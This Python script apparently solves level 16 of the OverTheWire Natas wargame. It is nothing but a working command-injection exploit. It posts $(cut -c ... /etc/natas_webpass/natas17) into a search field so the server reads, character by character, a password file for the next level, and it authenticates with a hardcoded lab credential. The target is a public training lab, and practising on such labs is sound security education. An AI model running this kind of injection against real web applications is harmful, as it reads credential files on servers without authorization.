import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as bs
import string
import json

with requests.Session() as s:
    auth = HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
    url = 'http://natas16.natas.labs.overthewire.org'
    
    for i in range(1, 32+1):
        bash = rf'$(cut -c {i} /etc/natas_webpass/natas17)'

        r = s.post(url, auth=auth, data={'needle': bash})

        print(list(filter(
            lambda s: len(s) <= 10,
            bs(r.content).find('div', id='content').find('pre').next.splitlines()
        )))
